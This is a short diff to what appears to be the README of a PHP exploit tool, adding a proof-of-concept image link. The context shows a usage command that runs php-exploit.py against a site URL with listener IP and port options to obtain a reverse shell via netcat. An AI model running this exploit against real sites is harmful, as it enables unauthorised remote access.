@@ -35,3 +35,5 @@ To get a reverse shell you need open another terminal with NC.
 ```
 python3 php-exploit.py --url https://site.com --lhost YOUR-IP --lport YOUR-PORT
 ```
+
+!()[poc-image.png]
